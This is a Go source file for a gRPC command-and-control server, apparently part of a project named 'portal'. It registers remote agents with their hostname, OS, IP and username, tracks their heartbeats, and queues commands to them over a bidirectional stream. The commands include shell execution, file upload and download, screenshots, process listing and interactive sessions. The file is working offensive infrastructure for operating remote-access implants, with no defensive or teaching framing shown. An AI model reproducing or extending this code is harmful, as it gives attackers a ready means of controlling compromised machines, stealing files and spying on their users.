package server

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/keepalive"

	pb "portal/proto"
)

// C2Server implements the C2Service
type C2Server struct {
	pb.UnimplementedC2ServiceServer
	mu            sync.Mutex
	agents        map[string]*Agent
	commandQueues map[string]chan *pb.Command
}

// Agent represents a connected agent
type Agent struct {
	Info      *pb.AgentInfo
	LastSeen  time.Time
	IsActive  bool
	Commands  chan *pb.Command
	Responses chan *pb.CommandResponse
}

// NewC2Server creates a new C2 server
func NewC2Server() *C2Server {
	return &C2Server{
		agents:        make(map[string]*Agent),
		commandQueues: make(map[string]chan *pb.Command),
	}
}

// Start starts the gRPC server
func (s *C2Server) Start(address string) error {
	lis, err := net.Listen("tcp", address)
	if err != nil {
		return fmt.Errorf("failed to listen: %w", err)
	}

	var opts []grpc.ServerOption
	opts = append(opts, grpc.KeepaliveParams(
		keepalive.ServerParameters{
			MaxConnectionIdle: 5 * time.Minute,
			Time:              60 * time.Second,
			Timeout:           20 * time.Second,
		},
	))

	grpcServer := grpc.NewServer(opts...)
	pb.RegisterC2ServiceServer(grpcServer, s)

	log.Printf("C2 server started on %s", address)
	return grpcServer.Serve(lis)
}

// RegisterAgent registers a new agent with the C2 server
func (s *C2Server) RegisterAgent(ctx context.Context, info *pb.AgentInfo) (*pb.RegistrationResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Check if this is a reconnection from an existing agent by hostname and OS
	var existingAgentID string
	for id, agent := range s.agents {
		if agent.Info.Hostname == info.Hostname && agent.Info.Os == info.Os {
			existingAgentID = id
			log.Printf("Detected reconnection from existing agent: %s (%s)", info.Hostname, existingAgentID)
			break
		}
	}

	// If it's a reconnection, clean up old agent data
	if existingAgentID != "" {
		// Close existing command queue
		close(s.commandQueues[existingAgentID])
		delete(s.commandQueues, existingAgentID)

		// Use the existing agent ID for continuity
		info.AgentId = existingAgentID
		log.Printf("Reusing existing agent ID: %s for %s", existingAgentID, info.Hostname)
	} else {
		// Create a unique ID for new agents
		info.AgentId = fmt.Sprintf("agent-%d", time.Now().UnixNano())
		log.Printf("New agent registration from %s (%s)", info.Hostname, info.IpAddress)
	}

	// Create command and response channels
	cmdChan := make(chan *pb.Command, 100)
	respChan := make(chan *pb.CommandResponse, 100)

	// Store or update agent info
	s.agents[info.AgentId] = &Agent{
		Info:      info,
		LastSeen:  time.Now(),
		IsActive:  true,
		Commands:  cmdChan,
		Responses: respChan,
	}

	s.commandQueues[info.AgentId] = cmdChan

	log.Printf("Agent registered successfully: %s (%s)", info.AgentId, info.Hostname)

	return &pb.RegistrationResponse{
		Success: true,
		AgentId: info.AgentId,
	}, nil
}

// Heartbeat handles agent heartbeats
func (s *C2Server) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.HeartbeatResponse, error) {
	agentID := req.AgentId
	log.Printf("Received heartbeat from agent %s from IP %s", agentID, req.IpAddress)

	s.mu.Lock()
	defer s.mu.Unlock()

	agent, exists := s.agents[agentID]
	if !exists {
		log.Printf("Agent %s not registered but sent heartbeat, will ignore", agentID)
		return &pb.HeartbeatResponse{
			Success:    false,
			ServerTime: time.Now().Unix(),
			Message:    "Agent not registered",
		}, nil
	}

	// Update agent's last seen time
	agent.LastSeen = time.Now()
	agent.IsActive = true

	// Update IP address if it's provided and different
	if req.IpAddress != "" && req.IpAddress != agent.Info.IpAddress {
		log.Printf("Updating agent %s IP from %s to %s", agentID, agent.Info.IpAddress, req.IpAddress)
		agent.Info.IpAddress = req.IpAddress
	}

	// Update system stats if provided
	if req.Stats != nil {
		// Store stats in a way that they can be retrieved later
		log.Printf("Agent %s stats - CPU: %.2f%%, Memory: %.2f%%, Uptime: %d sec",
			req.AgentId, req.Stats.CpuUsage, req.Stats.MemoryUsage, req.Stats.Uptime)
	}

	return &pb.HeartbeatResponse{
		Success:    true,
		ServerTime: time.Now().Unix(),
		Message:    "Heartbeat acknowledged",
	}, nil
}

// SendCommands handles bidirectional streaming for commands
func (s *C2Server) SendCommands(stream pb.C2Service_SendCommandsServer) error {
	// First message should contain agent ID in a Command
	firstCmd, err := stream.Recv()
	if err != nil {
		return err
	}

	// Using the ID field to identify the agent
	agentID := firstCmd.Id
	log.Printf("Agent %s connected to command stream", agentID)

	s.mu.Lock()
	agent, exists := s.agents[agentID]
	if !exists {
		s.mu.Unlock()
		return fmt.Errorf("agent not registered")
	}

	// Update agent's last seen time
	agent.LastSeen = time.Now()
	agent.IsActive = true

	cmdChan := agent.Commands
	s.mu.Unlock()

	// Create a context with cancellation for this stream
	ctx, cancel := context.WithCancel(stream.Context())
	defer cancel()

	// Handle incoming command responses
	go func() {
		for {
			cmd, err := stream.Recv()
			if err != nil {
				log.Printf("Error receiving command from agent %s: %v", agentID, err)
				cancel() // Cancel the context to signal termination
				return
			}

			// Update agent's last seen time with each received command
			s.mu.Lock()
			if agent, exists := s.agents[agentID]; exists {
				agent.LastSeen = time.Now()
				agent.IsActive = true
			}
			s.mu.Unlock()

			// Command is a response to a previous command
			if cmd.CommandType == "response" {
				log.Printf("Received command result from agent %s: %s", agentID, string(cmd.Payload))

				// Store the response
				resp := &pb.CommandResponse{
					CommandId:    cmd.Id,
					Success:      true,
					Result:       cmd.Payload,
					ErrorMessage: "",
					Timestamp:    time.Now().Unix(),
				}

				s.mu.Lock()
				if agent, exists := s.agents[agentID]; exists {
					agent.Responses <- resp
				}
				s.mu.Unlock()
			} else {
				log.Printf("Received command %s from agent %s", cmd.Id, agentID)

				// Generate and send a response
				resp := &pb.CommandResponse{
					CommandId:    cmd.Id,
					Success:      true,
					Result:       []byte("Command received"),
					ErrorMessage: "",
					Timestamp:    time.Now().Unix(),
				}

				// Process the command response
				s.mu.Lock()
				if agent, exists := s.agents[agentID]; exists {
					agent.Responses <- resp
				}
				s.mu.Unlock()
			}
		}
	}()

	// Send commands to the agent
	for {
		select {
		case cmd := <-cmdChan:
			// Format the command based on type
			formattedPayload := formatCommandPayload(cmd.CommandType, cmd.Payload)

			// Create a response to send to the agent
			resp := &pb.CommandResponse{
				CommandId:    cmd.Id,
				Success:      true,
				Result:       formattedPayload,
				ErrorMessage: "",
				Timestamp:    time.Now().Unix(),
			}

			if err := stream.Send(resp); err != nil {
				log.Printf("Error sending command response to agent %s: %v", agentID, err)
				return err
			}
			log.Printf("Sent command %s to agent %s", cmd.Id, agentID)
		case <-ctx.Done():
			log.Printf("Command stream for agent %s closed", agentID)
			return nil
		}
	}
}

// formatCommandPayload formats the command payload based on its type
func formatCommandPayload(cmdType string, payload []byte) []byte {
	switch cmdType {
	case "shell":
		return []byte(fmt.Sprintf("shell:%s", payload))
	case "upload":
		return []byte(fmt.Sprintf("upload:%s", payload))
	case "download":
		return []byte(fmt.Sprintf("download:%s", payload))
	case "screenshot":
		return []byte("screenshot:")
	case "system":
		return []byte("system:")
	case "process":
		return []byte("process:")
	case "interactive":
		return []byte(fmt.Sprintf("interactive:%s", payload))
	case "input":
		return []byte(fmt.Sprintf("input:%s", payload))
	case "output":
		return []byte("output:")
	default:
		return payload
	}
}

// SendCommandToAgent queues a command to be sent to an agent
func (s *C2Server) SendCommandToAgent(agentID string, cmd *pb.Command) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	cmdChan, exists := s.commandQueues[agentID]
	if !exists {
		return fmt.Errorf("agent %s not registered", agentID)
	}

	select {
	case cmdChan <- cmd:
		return nil
	default:
		return fmt.Errorf("command queue full for agent %s", agentID)
	}
}

// GetAgentList returns a list of all registered agents
func (s *C2Server) GetAgentList() []*pb.AgentInfo {
	s.mu.Lock()
	defer s.mu.Unlock()

	agents := make([]*pb.AgentInfo, 0, len(s.agents))
	now := time.Now()

	for id, agent := range s.agents {
		// Create a copy of the agent info to avoid race conditions
		agentInfo := &pb.AgentInfo{
			AgentId:          id,
			Hostname:         agent.Info.Hostname,
			Os:               agent.Info.Os,
			Architecture:     agent.Info.Architecture,
			IpAddress:        agent.Info.IpAddress,
			Username:         agent.Info.Username,
		}

		// Use LastSeen as the registration_time for UI status determination
		if !agent.LastSeen.IsZero() {
			agentInfo.RegistrationTime = agent.LastSeen.Unix()

			// Log the last seen time for debugging
			log.Printf("Agent %s last seen %s ago",
				id,
				time.Since(agent.LastSeen).Round(time.Second))
		} else if agent.Info.RegistrationTime > 0 {
			// Fallback to original registration time if LastSeen is not set
			agentInfo.RegistrationTime = agent.Info.RegistrationTime
		} else {
			// If no time information is available, use a time far in the past to show as offline
			agentInfo.RegistrationTime = now.Add(-24 * time.Hour).Unix()
		}

		// Update the IsActive flag based on last seen time
		// Agents not seen in the last 30 seconds are considered inactive
		if now.Sub(agent.LastSeen) <= 30*time.Second {
			agent.IsActive = true
		} else {
			agent.IsActive = false
		}

		agents = append(agents, agentInfo)
	}

	return agents
}

// GetAgent returns information about a specific agent
func (s *C2Server) GetAgent(agentID string) (*Agent, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()

	agent, exists := s.agents[agentID]
	return agent, exists
}